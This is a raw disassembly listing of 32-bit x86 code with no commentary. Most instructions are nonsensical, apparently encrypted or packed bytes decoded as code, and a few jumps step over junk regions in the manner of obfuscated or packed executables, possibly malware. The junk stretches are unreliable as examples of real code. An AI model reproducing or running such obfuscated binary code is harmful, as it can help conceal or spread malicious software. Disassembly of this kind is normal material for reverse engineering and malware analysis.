  40696e:	lea    edx,[edi-0x28]
  406971:	jge    0x4069cc
  406973:	dec    edi
  406974:	lds    eax,FWORD PTR es:[eax+0x15]
  406978:	test   DWORD PTR [ebx+0x620e8a2c],edi
  40697e:	fist   DWORD PTR [esi-0x3c6b5481]
  406984:	xor    al,BYTE PTR [edx-0x617d55d2]
  40698a:	lods   eax,DWORD PTR ds:[esi]
  40698b:	fdivr  st(1),st
  40698d:	and    DWORD PTR fs:[esi+0x4b6c1e68],esi
  406994:	retf   
  406995:	stos   DWORD PTR es:[edi],eax
  406996:	xor    BYTE PTR [edx*8+0x657f68d2],ah
  40699d:	test   al,0xb6
  40699f:	pop    esp
  4069a0:	outs   dx,BYTE PTR ds:[esi]
  4069a1:	mov    al,ds:0x84b9092f
  4069a6:	jo     0x406963
  4069a8:	ret    0xbc61
  4069ab:	scas   eax,DWORD PTR es:[edi]
  4069ac:	pushf  
  4069ad:	xchg   ecx,eax
  4069ae:	int    0xc
  4069b0:	xchg   edx,eax
  4069b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069b2:	xor    al,0x3e
  4069b4:	sar    BYTE PTR [esi-0x74408a2c],cl
  4069ba:	das    
  4069bb:	mov    ds:0x505416f3,eax
  4069c0:	cmc    
  4069c1:	pop    esp
  4069c2:	imul   esi,edx,0xffffffa0
  4069c5:	xchg   edi,eax
  4069c6:	fnstcw WORD PTR [esi+0x614143cb]
  4069cc:	loop   0x406a08
  4069ce:	shl    ch,cl
  4069d0:	xor    ebx,0xffffff83
  4069d3:	cmp    al,0x3b
  4069d5:	xor    ebx,DWORD PTR [ecx+0x532c0d1]
  4069db:	jno    0x4069dd
  4069dd:	in     al,0xff
  4069df:	pop    esi
  4069e0:	clc    
  4069e1:	loope  0x40697b
  4069e3:	push   0x1d20649d
  4069e8:	out    0xa4,al
  4069ea:	dec    ebp
  4069eb:	push   edx
  4069ec:	mov    al,0x1
  4069ee:	sti    
  4069ef:	(bad)  
  4069f0:	repz sub esi,0x1e
  4069f4:	pop    es
  4069f5:	pop    ss
  4069f6:	sub    DWORD PTR [ebx+0x7cddba9],0xffffffce
  4069fd:	retf   0x3d17
  406a00:	in     al,dx
  406a01:	mov    edx,0xe7851a57
  406a06:	ss fdiv st(2),st
  406a0a:	popf   
  406a0b:	cld    
  406a0c:	fnstcw WORD PTR [edi-0x4d0ac769]
  406a12:	enter  0x1b28,0x9f
  406a16:	fwait
  406a17:	cld    
  406a18:	xchg   BYTE PTR [eax-0x69e73ce2],dl
  406a1e:	mov    edi,0x4f89f364
  406a23:	pop    edi
  406a24:	cdq    
  406a25:	imul   esi,DWORD PTR [esi-0x5af79d1b],0x74865961
  406a2f:	push   esi
  406a30:	sbb    DWORD PTR [edi],0xffffffc9
  406a33:	(bad)  
  406a34:	es mov ch,0xfd
  406a37:	stos   DWORD PTR es:[edi],eax
  406a38:	scas   eax,DWORD PTR es:[edi]
  406a39:	std    
  406a3a:	aaa    
  406a3b:	or     ebx,eax
  406a3d:	jmp    0xad32d06b
  406a42:	pop    ebp
  406a43:	data16 scas al,BYTE PTR es:[edi]
  406a45:	or     DWORD PTR [esp+esi*1+0x2a],esp
  406a49:	iret   
  406a4a:	mov    BYTE PTR [eax],al
  406a4c:	in     eax,dx
  406a4d:	js     0x406a19
  406a4f:	outs   dx,BYTE PTR ds:[esi]
  406a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a51:	push   ebp
  406a52:	mov    ecx,0x1bc1715f
  406a57:	leave  
  406a58:	adc    ebx,ebx
  406a5a:	mov    esi,0x63ee07b1
  406a5f:	jecxz  0x406a5e
  406a61:	push   esp
  406a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a63:	out    dx,al
  406a64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a65:	xchg   edx,eax
  406a66:	ds test al,0xa
  406a69:	lds    ecx,FWORD PTR [esi+0x77]
  406a6c:	in     al,dx
  406a6d:	push   cs
  406a6e:	imul   ebp,DWORD PTR [edx-0x23],0x5fe68754
  406a75:	loopne 0x406a46
  406a77:	sub    ebx,DWORD PTR [ebx-0x1e2e2ea9]
  406a7d:	retf   
  406a7e:	add    BYTE PTR [ecx],bh
  406a80:	out    dx,al
  406a81:	adc    DWORD PTR [ebx],ebx
  406a83:	xor    ax,cx
  406a86:	mov    ecx,0x3b00
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0xa4e5:0xd9dda5c
  406abc:	mov    DWORD PTR [ebp+0x60],ebx
  406abf:	sar    DWORD PTR [esp+edi*2+0x30],0x7e
  406ac4:	jl     0x406b42
  406ac6:	rcl    BYTE PTR [ebx-0x18],cl
  406ac9:	push   0x1f
  406acb:	and    eax,0xda8f7802
  406ad0:	fwait
  406ad1:	sar    DWORD PTR [ecx+0x3aa270aa],cl
  406ad7:	push   0xffffffba
  406ad9:	aad    0x1f
  406adb:	xchg   edi,eax
  406adc:	or     ah,BYTE PTR [edx+esi*4-0x361eff24]
  406ae3:	cwde   
  406ae4:	int    0x51
  406ae6:	cmc    
  406ae7:	rol    DWORD PTR [edi-0x7341670f],1
  406aed:	out    0x2e,eax
  406aef:	stos   BYTE PTR es:[edi],al
  406af0:	mov    dl,0x3c
  406af2:	cmp    eax,0x75b8ea0f
  406af7:	cld    
  406af8:	cmp    al,BYTE PTR [edx+0x635845f6]
  406afe:	and    al,0x46
  406b00:	test   DWORD PTR [eax-0x3a],ebp
  406b03:	cmp    eax,0x481438e3
  406b08:	push   edi
  406b09:	shl    ah,1
  406b0b:	add    ebp,DWORD PTR [ebx+0x1580ba46]
  406b11:	inc    ebp
  406b12:	fstp   TBYTE PTR [ecx+0x39]
  406b15:	add    al,0x76
  406b17:	inc    ecx
  406b18:	shr    ebx,0x99
  406b1b:	leave  
  406b1c:	js     0x406b36
  406b1e:	jl     0x406b61
  406b20:	sar    BYTE PTR [esi],0x99
  406b23:	and    esi,DWORD PTR [ecx]
  406b25:	xor    esi,DWORD PTR [ebx+0x1f]
  406b28:	out    0xa2,al
  406b2a:	ins    BYTE PTR es:[edi],dx
  406b2b:	adc    DWORD PTR [edx+eiz*2-0x4fc1cd7b],ebp
  406b32:	mov    edi,0xfcc51a00
  406b37:	ret    
  406b38:	aas    
  406b39:	int3   
  406b3a:	mov    ss,edi
  406b3c:	mov    cl,0xd8
  406b3e:	rcl    BYTE PTR [ebp-0x5f],1
  406b41:	icebp  
  406b42:	mov    cl,0x34
  406b44:	ins    DWORD PTR es:[edi],dx
  406b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b46:	jo     0x406ada
  406b48:	mov    esp,eax
  406b4a:	inc    eax
  406b4b:	mov    ecx,0xf64b128c
  406b50:	mov    ecx,ebx
  406b52:	inc    edx
  406b53:	and    DWORD PTR [eax-0xf],ecx
  406b56:	push   cs
  406b57:	cmc    
  406b58:	mov    ebp,0x17dd1680
  406b5d:	jns    0x406b17
  406b5f:	cmp    al,0x48
  406b61:	outs   dx,BYTE PTR ds:[esi]
  406b62:	adc    ebp,DWORD PTR ds:0x54dfec39
  406b68:	scas   eax,DWORD PTR es:[edi]
  406b69:	(bad)  
  406b6a:	jns    0x406b1c
  406b6c:	out    dx,eax
  406b6d:	dec    edx
  406b6e:	stos   BYTE PTR es:[edi],al
  406b6f:	jmp    0x872b:0x7ecbee4
  406b76:	add    BYTE PTR [ecx],bh
  406b78:	jnp    0x406b87
  406b7a:	in     al,0xbc
  406b7c:	sti    
  406b7d:	icebp  
  406b7e:	mul    BYTE PTR [si]
  406b81:	mov    esp,0xf05df7f1
  406b86:	adc    BYTE PTR [edx],dl
  406b88:	div    BYTE PTR [esp+eax*4+0x4d]
  406b8c:	xor    eax,0xee71761b
  406b91:	pop    eax
  406b92:	mov    edi,0xd0bd8b
  406b97:	pop    eax
  406b98:	test   ebx,esp
  406b9a:	jecxz  0x406b4b
  406b9c:	in     al,0xaf
  406b9e:	loopne 0x406ba9
  406ba0:	pop    eax
  406ba1:	call   0x2d5b496f
  406ba6:	fnstenv ds:0x87a7b565
  406bac:	xor    DWORD PTR [ecx],esp
  406bae:	mov    ch,0x3b
  406bb0:	push   ds
  406bb1:	jno    0x406b65
  406bb3:	push   edx
  406bb4:	ret    0xdde8
  406bb7:	sub    edi,esi
  406bb9:	push   edx
  406bba:	cld    
  406bbb:	mov    edx,0x59975144
  406bc0:	fwait
  406bc1:	push   edx
  406bc2:	xor    eax,0xfaabb705
  406bc7:	pop    eax
  406bc8:	or     eax,0x9cda983c
  406bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bce:	push   0xffffff97
  406bd0:	mov    ebx,0xc79bdece
  406bd5:	push   esp
  406bd6:	arpl   WORD PTR [ecx+0x73a5b526],ax
  406bdc:	inc    ebp
  406bdd:	inc    ebx
  406bde:	push   0xa32cc364
  406be3:	xchg   ebx,eax
  406be4:	or     esi,0xffffffbb
  406be7:	fdiv   DWORD PTR [edi+0x61bc54e5]
  406bed:	adc    esp,0xffffffb6
  406bf0:	adc    al,0x81
  406bf2:	xchg   ecx,eax
  406bf3:	pop    ss
  406bf4:	mov    DWORD PTR [esi+esi*2+0x5b],0x9ac213b9
  406bfc:	dec    esi
  406bfd:	inc    ebp
  406bfe:	enter  0x1554,0xc3
  406c02:	jne    0x406bde
  406c04:	push   edx
  406c05:	xchg   DWORD PTR [ebp-0x69],eax
  406c08:	in     al,0x2
  406c0a:	xor    eax,0xebde1008
  406c0f:	clc    
  406c10:	out    dx,eax
  406c11:	jmp    0xce48:0x3c7cb689
  406c18:	adc    eax,0xc17d11cb
  406c1d:	retf   
  406c1e:	or     eax,0x346c4ce3
  406c23:	ds dec esp
  406c25:	pop    esp
  406c26:	(bad)  
  406c27:	ds cld 
  406c29:	sub    al,0xb7
  406c2b:	sub    al,0x9f
  406c2d:	out    0x74,al
  406c2f:	or     edx,DWORD PTR [edx]
  406c31:	pop    ss
  406c32:	cli    
  406c33:	mov    bh,0x5a
  406c35:	popa   
  406c36:	push   0xffffffb6
  406c38:	xor    esp,DWORD PTR [ebx]
  406c3a:	jns    0x406c6c
  406c3c:	or     al,BYTE PTR [edx+0x1618076c]
  406c42:	stos   BYTE PTR es:[edi],al
  406c43:	push   edx
  406c44:	test   al,0xb4
  406c46:	jecxz  0x406cc1
  406c48:	mov    dh,BYTE PTR [edi-0x24]
  406c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c4c:	dec    ecx
  406c4d:	jp     0x406c87
  406c4f:	and    eax,0xe6625a61
  406c54:	cdq    
  406c55:	or     al,0x16
  406c57:	icebp  
  406c58:	inc    esp
  406c59:	mov    ebp,0x8386908e
  406c5e:	ins    BYTE PTR es:[edi],dx
  406c5f:	pusha  
  406c60:	(bad)  
  406c61:	fld    QWORD PTR [ecx+eax*2]
  406c64:	push   edi
  406c65:	stos   DWORD PTR es:[edi],eax
  406c66:	dec    ecx
  406c67:	mov    dh,0x29
  406c69:	cmp    ch,BYTE PTR [edi+0x6fc85be9]
  406c6f:	nop
  406c70:	lock lds eax,FWORD PTR [ebp-0x256b053a]
  406c77:	test   al,0xed
  406c79:	cmp    BYTE PTR [ebp+eiz*8-0x62],0xf9
  406c7e:	mov    ah,0xef
  406c80:	jmp    0x2b8e:0x4becc407
  406c87:	mov    ecx,0x541ee70f
  406c8c:	repz fcmovnb st,st(5)
  406c8f:	dec    esi
  406c90:	out    dx,eax
  406c91:	xor    DWORD PTR [edx],edx
  406c93:	xlat   BYTE PTR ds:[ebx]
  406c94:	cmp    dh,dh
  406c96:	push   esp
  406c97:	shl    BYTE PTR [esi-0x682fed4a],1
  406c9d:	stos   DWORD PTR es:[edi],eax
  406c9e:	cdq    
  406c9f:	je     0x406d1d
  406ca1:	mov    ah,0xa6
  406ca3:	add    al,0x42
  406ca5:	pop    eax
  406ca6:	xor    edx,ebx
  406ca8:	(bad)  
  406ca9:	in     al,dx
  406caa:	or     DWORD PTR [eax-0x5b79de5d],edx
  406cb0:	aad    0xa9
  406cb2:	clc    
  406cb3:	pushf  
  406cb4:	lock mov al,ds:0x936b0233
  406cba:	add    eax,0x2942b25f
  406cbf:	inc    ecx
  406cc0:	shr    dl,0xb
  406cc3:	cmp    al,0x19
  406cc5:	pop    es
  406cc6:	repz pop ebp
  406cc8:	and    eax,0x9f8c3d27
  406ccd:	push   edi
  406cce:	mov    esi,0x11aabaf9
  406cd3:	push   eax
  406cd4:	cwde   
  406cd5:	dec    esi
  406cd6:	in     eax,0x90
  406cd8:	inc    esp
  406cd9:	mov    bh,0xe1
  406cdb:	(bad)  
  406cdc:	in     al,0x87
  406cde:	inc    ecx
  406cdf:	iret   
  406ce0:	sahf   
  406ce1:	jmp    0xc9d945e4
  406ce6:	jbe    0x406c6f
  406ce8:	out    0x90,eax
  406cea:	adc    dh,bh
  406cec:	out    0x5,eax
  406cee:	mov    esp,DWORD PTR ds:0xc977fbc5
  406cf4:	jle    0x406c77
  406cf6:	fdivr  st,st(1)
  406cf8:	mov    bl,0xc4
  406cfa:	inc    edx
  406cfb:	ss inc esp
  406cfd:	sbb    BYTE PTR [ebp+0x66f30b9c],cl
  406d03:	mov    eax,DWORD PTR [ebp-0x8]
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4336ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43371b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43369b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433643
  406d52:	or     DWORD PTR ds:0x43369f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433657,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43371b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	mov    dl,BYTE PTR ss:[edx+0x2481d366]
  406d85:	ret    0x7c7c
  406d88:	xlat   BYTE PTR ds:[ebx]
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d9f
  406d8d:	mov    DWORD PTR ds:0x6b7decc2,edi
  406d93:	sub    eax,0x8e45d68d
  406d98:	mov    ebx,0x4f8814d3
  406d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d9e:	fnstcw WORD PTR [ecx+0x66658869]
  406da4:	jp     0x406d5e
  406da6:	imul   ecx,DWORD PTR fs:[ecx+0x48bc9458],0xe
  406dae:	(bad)  
  406daf:	loop   0x406d97
  406db1:	cs hlt 
  406db3:	jl     0x406de4
  406db5:	cdq    
  406db6:	(bad)  
  406db7:	push   ss
  406db8:	call   0x2b76:0x7927f31b
  406dbf:	stos   BYTE PTR es:[edi],al
  406dc0:	cs sbb eax,0xc0173e32
  406dc6:	out    dx,eax
  406dc7:	stc    
  406dc8:	xor    bh,BYTE PTR [eax+0x41]
  406dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dcc:	mov    WORD PTR [ecx+0x4574fc7e],fs
  406dd2:	mov    ch,0xcb
  406dd4:	mov    ecx,0x643aee40
  406dd9:	cmovae esp,DWORD PTR [ebp-0x343f2ba0]
  406de0:	cld    
  406de1:	mov    ds:0xb9a4f92c,eax
  406de6:	xor    edx,ecx
  406de8:	dec    eax
  406de9:	ucomiss xmm4,DWORD PTR [edi]
  406dec:	xor    eax,0xe041d466
  406df1:	frstor [edi]
  406df3:	shr    BYTE PTR [eax-0x64077a34],cl
  406df9:	or     BYTE PTR [eax],al
  406dfb:	mov    cl,0x52
  406dfd:	dec    esp
  406dfe:	jmp    0x81381cba
  406e03:	gs (bad) 
  406e05:	iret   
  406e06:	jl     0x406da6
  406e08:	sub    al,0xd4
  406e0a:	sbb    al,0xc7
  406e0c:	mov    DWORD PTR [eax-0x291099cb],ecx
  406e12:	enter  0xafd6,0xb
  406e16:	inc    edi
  406e17:	pop    eax
  406e18:	rol    BYTE PTR [esp+edi*2-0x2d2b69a0],0x97
  406e20:	add    eax,0x4cbe8f52
  406e25:	rol    DWORD PTR [edx+0x6f],1
  406e28:	outs   dx,BYTE PTR ds:[esi]
  406e29:	jnp    0x406e26
  406e2b:	mov    eax,0x59751e01
  406e30:	cld    
  406e31:	lock xor edi,DWORD PTR [ecx-0x73]
  406e35:	or     edx,esi
  406e37:	retf   
  406e38:	or     BYTE PTR [edi+0xa2bf76],bh
  406e3e:	ds cmp eax,0x129d9623
  406e44:	mov    cl,0x40
  406e46:	sub    eax,DWORD PTR [esi-0x2a]
  406e49:	jb     0x406e99
  406e4b:	es popa 
  406e4d:	adc    ebp,edx
  406e4f:	sbb    al,0x4e
  406e51:	dec    edi
  406e52:	xchg   edx,eax
  406e53:	mov    esp,0x58b26f29
  406e58:	bound  esp,QWORD PTR [esi-0x3cc64b21]
  406e5e:	inc    ebp
  406e5f:	xor    ch,ah
  406e61:	cmp    eax,0x64ac75f5
  406e66:	push   edx
  406e67:	push   ds
  406e68:	adc    al,0xb5
  406e6a:	mov    dl,0x14
  406e6c:	pop    esi
  406e6d:	or     DWORD PTR [edx+0x47],eax
  406e70:	vandnps ymm4,ymm2,YMMWORD PTR [edi-0xa]
  406e75:	inc    esp
  406e76:	mov    WORD PTR [ecx*4-0x3935e272],cs
  406e7d:	test   al,0xd9
  406e7f:	call   ecx
  406e81:	cld    
  406e82:	jle    0x406e7d
  406e84:	rol    ebp,cl
  406e86:	invd   
  406e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e89:	bound  ebp,QWORD PTR [esi]
  406e8b:	xchg   edx,eax
  406e8c:	dec    ebp
  406e8d:	out    0xd3,eax
  406e8f:	xor    esp,DWORD PTR [ebx+0x57]
  406e92:	and    al,0x39
  406e94:	stos   BYTE PTR es:[edi],al
  406e95:	arpl   WORD PTR [esi+0x14],bx
  406e98:	push   esp
  406e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e9a:	js     0x406f01
  406e9c:	cli    
  406e9d:	iret   
  406e9e:	push   0x76
  406ea0:	sar    BYTE PTR [esi-0x3f],0x66
  406ea4:	rcr    BYTE PTR [ebx+eiz*4],cl
  406ea7:	sbb    esi,eax
  406ea9:	sub    BYTE PTR [ebp-0x63953016],bh
  406eaf:	adc    dl,BYTE PTR ds:0x7f5aa13
  406eb5:	or     esp,edi
  406eb7:	mov    edi,0xbd24d196
  406ebc:	mov    eax,ds:0x638bd96d
  406ec1:	fcmovnbe st,st(1)
  406ec3:	xchg   ah,ch
  406ec5:	mov    DWORD PTR [eax+edx*8+0x4d4ddbe2],ebx
  406ecc:	cld    
  406ecd:	jns    0x406ed2
  406ecf:	js     0x406ebf
  406ed1:	popf   
  406ed2:	cmp    DWORD PTR [edx-0x3706ead1],0xffffffd9
  406ed9:	mov    ds:0xd52a8046,eax
  406ede:	sub    eax,0xe4595aa7
  406ee3:	imul   BYTE PTR [ebp-0x78c30c3d]
  406ee9:	into   
  406eea:	pop    ss
  406eeb:	mov    edi,0x57d18dfd
  406ef0:	in     al,0xd2
  406ef2:	pusha  
  406ef3:	adc    edx,ecx
  406ef5:	daa    
  406ef6:	js     0x406f57
  406ef8:	ret    
  406ef9:	mov    BYTE PTR [ecx-0x3a795516],bh
  406eff:	sub    DWORD PTR [edx-0x62],esp
  406f02:	shr    ebp,0x45
  406f05:	jg     0x406f22
  406f07:	adc    eax,0x363c02d2
  406f0c:	mov    DWORD PTR [edi-0x2e1662d2],ebp
  406f12:	mov    al,0xe5
  406f14:	sub    ebx,DWORD PTR [eax]
  406f16:	adc    al,0x61
  406f18:	jmp    0x406f17
  406f1a:	pop    ecx
  406f1b:	push   ss
  406f1c:	sub    ecx,DWORD PTR [ecx+0x2477eaaa]
  406f22:	gs into 
  406f24:	imul   ecx,DWORD PTR [esi],0xffffffc5
  406f27:	pop    eax
  406f28:	pop    esp
  406f29:	sbb    eax,edi
  406f2b:	sar    DWORD PTR [esi+0x6d],1
  406f2e:	mov    esp,0xefd465f9
  406f33:	test   esp,ebx
  406f35:	and    cl,BYTE PTR [edi+0x16]
  406f38:	fstp   TBYTE PTR [ecx+0x1d]
  406f3b:	ror    cl,cl
  406f3d:	mov    cl,0xeb
  406f3f:	adc    al,0x5d
  406f41:	jmp    0x41d56d21
  406f46:	(bad)  
  406f48:	jno    0x406f1f
  406f4a:	mov    ecx,0x9b250853
  406f4f:	arpl   WORD PTR [edx],sp
  406f51:	mov    ds:0x4dbe5344,al
  406f56:	(bad)  
  406f57:	cmp    DWORD PTR [edi+0x1d1b10c4],ecx
  406f5d:	dec    edx
  406f5e:	fst    DWORD PTR [ecx-0x2a]
  406f61:	push   ds
  406f62:	jmp    FWORD PTR [eax-0x7b]
  406f65:	loope  0x406fc0
  406f67:	inc    edx
  406f68:	push   ss
  406f69:	outs   dx,BYTE PTR ds:[esi]
  406f6a:	cmp    DWORD PTR [eax+0x48ea3be],ebp
  406f70:	pushf  
  406f71:	dec    eax
  406f72:	addr16 nop
  406f74:	jne    0x406fa0
  406f76:	lahf   
  406f77:	adc    dl,BYTE PTR [edx]
  406f79:	mov    BYTE PTR ds:0x916c7305,dh
  406f7f:	ficom  WORD PTR [ebx+0x563545ef]
  406f85:	mov    al,0xe5
  406f87:	xchg   ecx,eax
  406f88:	mov    bh,cl
  406f8a:	ins    BYTE PTR es:[edi],dx
  406f8b:	shl    esi,cl
  406f8d:	push   0xffffffcd
  406f8f:	adc    DWORD PTR [ebx-0x7d],0xb82f07cb
  406f96:	and    DWORD PTR [edx+0x73],ecx
  406f99:	dec    eax
  406f9a:	lds    esp,FWORD PTR [ebx+0x5696a620]
  406fa0:	popa   
  406fa1:	das    
  406fa2:	mov    ch,0x17
  406fa4:	mov    cl,0x67
  406fa6:	loop   0x406f9b
  406fa8:	shl    ch,1
  406faa:	mov    ah,0xc8
  406fac:	pop    ds
  406fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fae:	test   DWORD PTR [eax-0xe],edx
  406fb1:	or     dl,al
  406fb3:	pop    edi
  406fb4:	loop   0x406f6c
  406fb6:	in     eax,dx
  406fb7:	and    eax,0xbb6557f8
  406fbc:	push   ecx
  406fbd:	imul   ebx,DWORD PTR [edi],0x870ac0fb
  406fc3:	inc    esp
  406fc4:	fmul   DWORD PTR [ebp+ecx*4+0xa]
  406fc8:	add    dh,bl
  406fca:	sar    DWORD PTR [ebx-0x50e94932],cl
  406fd0:	lods   al,BYTE PTR ds:[esi]
  406fd1:	push   esp
  406fd2:	imul   esp,DWORD PTR [esi],0xfffffff2
  406fd5:	ret    0x2a4e
  406fd8:	dec    esp
  406fd9:	inc    ecx
  406fda:	mov    eax,0x49ba7cb9
  406fdf:	aam    0x7d
  406fe1:	test   BYTE PTR [edi-0x3617e3ef],dl
  406fe7:	jl     0x407045
  406fe9:	sahf   
  406fea:	mov    esp,esi
  406fec:	mov    eax,0xf8a66f91
  406ff1:	add    esp,DWORD PTR [eax-0xed65a27]
  406ff7:	loop   0x406fae
  406ff9:	(bad)
  406ffc:	out    dx,al
  406ffd:	adc    DWORD PTR [ebp+esi*8+0x2a08cd08],esi
  407004:	gs ins DWORD PTR es:[edi],dx
  407006:	gs jbe 0x407048
  407009:	mov    al,0xf6
  40700b:	add    DWORD PTR [edx+0x3a],esi
  40700e:	cmp    al,0x50
  407010:	cmp    eax,0xce51b639
  407015:	fisttp WORD PTR [edi-0x426f78d0]
  40701b:	imul   ebx,ecx,0x42
  40701e:	imul   esi,DWORD PTR [eax],0xa66150ef
  407024:	mov    eax,0xc80b142c
  407029:	ja     0x407073
  40702b:	mov    eax,0x5a46fdd9
  407030:	enter  0x3276,0x42
  407034:	icebp  
  407035:	pop    ebx
  407036:	pop    esp
  407037:	xchg   ebx,eax
  407038:	lods   al,BYTE PTR ds:[esi]
  407039:	xchg   ebx,eax
  40703a:	xchg   ebx,eax
  40703b:	repz xchg esi,eax
  40703d:	push   ecx
  40703e:	jge    0x40706b
  407040:	(bad)  
  407041:	stos   BYTE PTR es:[edi],al
  407042:	sub    dl,BYTE PTR [esi+0xd]
  407045:	mov    dl,0x5a
  407047:	dec    esp
  407048:	xor    dh,ah
  40704a:	enter  0xd454,0x5a
  40704e:	addr16 fwait
  407050:	adc    eax,0xd0970078
  407055:	inc    ecx
  407056:	fnstenv [edi]
  407058:	addr16 cmp eax,0x609b2f22
  40705e:	sub    eax,0xa1d7f652
  407063:	and    eax,0x5c1f6d43
  407068:	retf   0x4306
  40706b:	cmc    
  40706c:	mov    al,ds:0x1bddd2c2
  407071:	int3   
  407072:	mov    ch,0xea
  407074:	das    
  407075:	push   0xb258f17a
  40707a:	in     al,0xa3
  40707c:	push   es
  40707d:	dec    ebp
  40707e:	es std 
  407080:	cs cs pop edi
  407083:	loop   0x4070b0
  407085:	(bad)  
  407086:	out    0x73,eax
  407088:	sbb    BYTE PTR [eax],dl
  40708a:	sbb    ah,BYTE PTR [edi]
  40708c:	rol    BYTE PTR [ebp+0x5cd7a3f2],1
  407092:	ret    
  407093:	pop    DWORD PTR [edi]
  407095:	aas    
  407096:	sub    cl,BYTE PTR ss:[eax+0x6f]
  40709a:	test   eax,0xbcd13e07
  40709f:	adc    al,0xa
  4070a1:	gs sahf 
  4070a3:	test   al,0xb5
  4070a5:	ror    DWORD PTR [eax-0x3c5fd996],cl
  4070ab:	push   ecx
  4070ac:	sbb    bl,bh
  4070ae:	retf   
  4070af:	imul   al
  4070b1:	mov    ebp,0x3744e3d9
  4070b6:	popf   
  4070b7:	add    dl,bl
  4070b9:	jle    0x4070d1
  4070bb:	mov    al,ds:0x9b520b1c
  4070c0:	push   edi
  4070c1:	outs   dx,BYTE PTR ds:[esi]
  4070c2:	jno    0x4070d4
  4070c4:	out    dx,eax
  4070c5:	jp     0x40704e
  4070c7:	fistp  DWORD PTR [edx]
  4070c9:	into   
  4070ca:	hlt    
  4070cb:	jp     0x407121
  4070cd:	or     edx,esi
  4070cf:	lahf   
  4070d0:	sbb    BYTE PTR [edi],al
  4070d2:	pop    ebp
  4070d3:	call   0xa0a4:0x4da885fc
  4070da:	jp     0x407149
  4070dc:	pushf  
  4070dd:	xor    eax,0xc23e6e46
  4070e2:	xchg   BYTE PTR [esp+edi*2-0x7e27ba77],dh
  4070e9:	and    eax,0x43364f
  4070ee:	dec    ebp
  4070ef:	daa    
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4336f3
  407100:	add    ecx,DWORD PTR ds:0x433643
  407106:	mov    DWORD PTR ds:0x4336f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	(bad)  
  40711d:	out    dx,al
  40711e:	(bad)  
  40711f:	outs   dx,DWORD PTR ds:[esi]
  407120:	mov    edx,0x7c7ccfff
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x4070e6
  40712a:	out    0xac,eax
  40712c:	sub    edi,DWORD PTR [esi+edx*4]
  40712f:	cmc    
  407130:	and    eax,DWORD PTR [ebx]
  407132:	in     al,dx
  407133:	mov    WORD PTR [esi+esi*4],cs
  407136:	test   eax,0xc9254294
  40713b:	loop   0x4071a7
  40713d:	mov    ecx,DWORD PTR [ebx]
  40713f:	xchg   esi,eax
  407140:	shl    BYTE PTR [eax-0x1a],1
  407143:	fisttp WORD PTR [ebx]
  407145:	inc    esi
  407146:	mov    eax,0x5fbf7f3f
  40714b:	iret   
  40714c:	(bad)  
  40714d:	jne    0x4070e6
  40714f:	lds    ebx,FWORD PTR [ebp+0x67]
  407152:	arpl   dx,dx
  407154:	test   eax,0x6aeee2f4
  407159:	sub    al,0xfd
  40715b:	(bad)  
  40715c:	sti    
  40715d:	adc    BYTE PTR [eax-0x5b655b83],0x6d
  407164:	jp     0x40719c
  407166:	in     al,0x16
  407168:	mov    ah,0x93
  40716a:	xchg   DWORD PTR [ecx+0x79],esp
  40716d:	jmp    0x8582f4de
  407172:	pop    esi
  407173:	cmp    eax,0x62f58dcf
  407178:	test   DWORD PTR [ebp-0x64],0x76bed14c
  40717f:	int3   
  407180:	xchg   edi,eax
  407181:	jno    0x4071a2
  407183:	mov    edx,DWORD PTR [esi]
  407185:	repz sub eax,0xfb0623e0
  40718b:	pop    ebp
  40718c:	psubusw mm5,QWORD PTR [edi+0x48d57646]
